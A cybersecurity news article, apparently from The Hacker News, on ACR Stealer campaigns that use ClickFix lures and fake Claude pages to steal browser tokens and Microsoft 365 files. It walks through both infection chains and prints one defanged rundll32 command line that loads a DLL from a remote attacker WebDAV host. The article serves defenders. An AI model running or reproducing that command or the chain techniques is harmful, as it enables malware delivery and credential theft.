---
title: ACR Stealer Uses ClickFix Lures to Steal Browser Tokens and Microsoft 365 Files
url: https://thehackernews.com/2026/07/acr-stealer-uses-clickfix-lures-to.html
source: The Hacker News
date: 2026-07-17
fetch_date: 2026-07-18T04:46:40.441348
---

# ACR Stealer Uses ClickFix Lures to Steal Browser Tokens and Microsoft 365 Files

#1 Trusted Cybersecurity News Platform

Followed by 5.70+ million[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.facebook.com/thehackernews)

[![The Hacker News Logo](data:image/png;base64...)](/)

**

**

[** Get the Latest News](#email-outer)

* [Home](/)
* [Newsletter](#email-outer)
* [Webinars](/p/upcoming-hacker-news-webinars.html)

* [Home](/)
* [Threat Intelligence](/search/label/Threat%20Intelligence)
* [Vulnerabilities](/search/label/Vulnerability)
* [Cyber Attacks](/search/label/Cyber%20Attack)
* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Expert Insights](https://thehackernews.com/expert-insights/)
* [Awards](https://awards.thehackernews.com/)

**

**

**

Resources

* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Awards](https://awards.thehackernews.com/)
* [Free eBooks](https://thehackernews.tradepub.com)

About Site

* [About THN](/p/about-us.html)
* [Jobs](/p/careers-technical-writer-designer-and.html)
* [Advertise with us](/p/advertising-with-hacker-news.html)

Contact/Tip Us

[**

Reach out to get featured—contact us to send your exclusive story idea, research, hacks, or ask us a question or leave a comment/feedback!](/p/submit-news.html)

Follow Us On Social Media

[**](https://www.facebook.com/thehackernews)
[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.youtube.com/c/thehackernews?sub_confirmation=1)
[**](https://www.instagram.com/thehackernews/)

[** RSS Feeds](https://feeds.feedburner.com/TheHackersNews)
[** Email Alerts](#email-outer)

[![cybersecurity](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrKWHErc__Wn0forfQ5eJ5sIR1hVKCHCTeNQOaAX4lbygJ8S1Xpemx6JXl78dpwiT65DDBGURp48A3EemKzmli-jXPI3v1928MnJm-1j2ZPUaFXCvuySFhyphenhyphenKR-Li6fAinFT2bhLgsqUSNUR_ggMAnOHi3jD1qYWHXvueX8WdtxAd6GYety9cBGYABo18hX/s728-e100/tt-d.jpg)](https://thehackernews.uk/ai-zero-trust-h-d)

# [ACR Stealer Uses ClickFix Lures to Steal Browser Tokens and Microsoft 365 Files](https://thehackernews.com/2026/07/acr-stealer-uses-clickfix-lures-to.html)

**Swati Khandelwal**Jul 17, 2026Malware / Windows Security

[![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhj5a79jcbSLlpVrk_Tkl4E0wiB47Zu2a7V3UrYOddEgvO0bNMVU1VzwmLIK-Ac8I71znO7vmH7QSDdF9cg4-VeEzLo_7InYxfc5yaXG8Ziv-nVAK1qRCkTx73CVKtLOESbkL2yUF9srs53F9hLAkXt9hsiSTjntbS3ThRVi3ApZniyKapqVAgz9PEuW9o/s1700-e365/clicks.png)

[ACR Stealer](https://thehackernews.com/2025/02/new-malware-campaign-uses-cracked.html), an infostealer in circulation since 2024, is walking out of enterprise networks with saved browser passwords, live session tokens, PDFs, Microsoft 365 documents, and files from synced OneDrive and SharePoint folders.

It gets in because someone pasted a command into a Run box and pressed Enter. Microsoft [laid](https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/) out two of the delivery chains on Thursday. Its Defender Experts team, the company's managed detection arm, had watched ACR Stealer activity climb across customer environments from late April to mid-June, and says the campaigns are "successfully using [ClickFix lures](https://thehackernews.com/2026/01/clickfix-attacks-expand-using-fake.html) to steal browser credentials, authentication tokens, and sensitive documents."

Both chains open with the same prompt, then split: one leaves traces on disk, the other runs almost entirely in memory. Microsoft's remediation guidance tells victims to revoke tokens, not just rotate passwords.

## A payload in the pixels

The prompt likely arrives through malvertising or SEO-manipulated search results, the report says. The fileless chain starts when the pasted command spawns `mshta.exe` to pull remote HTA content. An embedded VBScript loader leans on COM objects to decode and fire PowerShell; that stage mints a victim ID, disables certificate validation, and runs what it retrieves in memory.

What it retrieves is a JPEG from an image host, with the [payload sitting in the pixels](https://thehackernews.com/2024/10/researchers-uncover-hijack-loader.html). Custom routines carve it out, decrypt it, decompress it, and execute it reflectively. Then it goes for Chrome and Edge, reading the `Login Data` and `Web Data` databases and invoking [DPAPI](https://thehackernews.com/2024/08/google-chrome-adds-app-bound-encryption.html) to decrypt the passwords, cookies, and tokens they hold. The PDFs on the Desktop and in Downloads go too.

On May 26, SANS Internet Storm Center handler Brad Duncan [documented a Windows infection](https://isc.sans.edu/diary/Possible%2BACR%2BStealer%2BFrom%2BPage%2BImpersonating%2BClaude/33018/) he traced to a page impersonating Claude, Anthropic's AI assistant, reached through malicious Google ads and often hidden behind `sites.google.com` URLs. The page served macOS instructions when opened on a Mac and Windows instructions when opened on Windows.

[![Cybersecurity](data:image/png;base64...)](https://thehackernews.uk/ai-vuln-protection-d)

Microsoft never names the lure. Two of the indicators in its Campaign 2 table, `creativecommunityinfo[.]art` and `enhanceblabber[.]cc`, are listed as a payload host and a C2. The Hacker News matched both to Duncan's chain, which ran through subdomains of each seven weeks earlier, and Microsoft's report cites his diary among the references.

That chain also pulled a 628 KB JPEG from ImgBB, an image-hosting service. He flagged it as part of the infection and got nothing out of it: "nor could I find any obvious signs of embedded data."

[Red Canary](https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2026/) had logged Claude-branded lures a month earlier, delivering ACR Stealer through fake Claude Code pages on GitLab such as `claude-desktop[.]gitlab[.]io`.

## The other chain leaves fingerprints

Microsoft's first chain writes to disk, which leaves defenders more to work with. The pasted command pulls a DLL straight off a [WebDAV share](https://thehackernews.com/2026/03/investigating-new-click-fix-variant.html) over HTTPS, using a GUID directory and a filename built to pass as something else; the report's example is `google.ct`.

Red Canary published the same shape in its May report, from April telemetry, weeks before Microsoft's writeup:

```
"C:\Windows\system32\rundll32.exe" \\sphere-api.dialectosphere.in[.]net\05fe317c-0981-4de2-bc8a-930d369db441\ck-3d80df5d12cdfe6450a782fc87bf66b444.google,#1
```

Two of the three variants Defender Experts saw use `pushd` to mount the remote share as a temporary local drive first, so the payload runs through what looks like a local path. The stealthiest wraps that in `conhost.exe --headless` to kill the console window and hides the strings for `pushd`, `rundll32`, and the remote host behind delayed environment-variable expansion.

[![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0nt-zc4YATBtEeQDFCOo2lAesVlEIerY4YgJbUnsMk-1Hm7p2Tkz5XcK7gDhoC-yoGASTMGQjbxyGXz82urOqLoSXOg_kT3sg0u6rY88sN6_eVDOtB5EmkT6JwgrgHGufL2H_jAysyiUgFYzL1ljFk7bfR9N_IcttjEFKXSl5wp4_U9E90LXoKVxi__0/s1700-e365/ms-clickfix.jpg)

What follows is obfuscated PowerShell. It drops a ZIP into a folder under `%LocalAppData%\Temp` with an innocuous name; Microsoft's example is `LogiOptionsPlus`. A bundled `pythonw.exe` then launches the Python script, so nothing flashes on screen. The installer wipes older copies before installing, which makes it an updater.

It persists through a hidden scheduled task posing as a software update, copies timestamps off `notepad.exe` onto its own files, and clears PowerShell history behind it. The last stage stays in memory, handing execution through the Windows Fiber API.

In a subset of these intrusions, a second Python loader talks to public blockchain RPC endpoints and Web3 node i...